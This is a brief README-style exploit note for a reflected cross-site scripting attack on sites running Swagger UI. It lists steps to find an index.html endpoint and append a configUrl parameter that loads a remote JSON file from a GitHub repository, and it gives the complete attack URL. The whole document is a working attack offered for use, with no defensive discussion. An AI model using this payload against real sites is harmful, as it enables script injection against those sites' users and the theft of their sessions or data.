# swagger-xss

# Exploit 

if a domain is is running swagger ,
1. first fuzz with this wordlists
2. if site have some endpoint like this
https://domain.ltd/index.html

3. payload : ?configUrl=https://raw.githubusercontent.com/NotSecure-In/swagger-xss/main/test.json

4. so entire rxss will look like this
5. https://domain.ltd/index.html?configUrl=https://raw.githubusercontent.com/NotSecure-In/swagger-xss/main/test.json
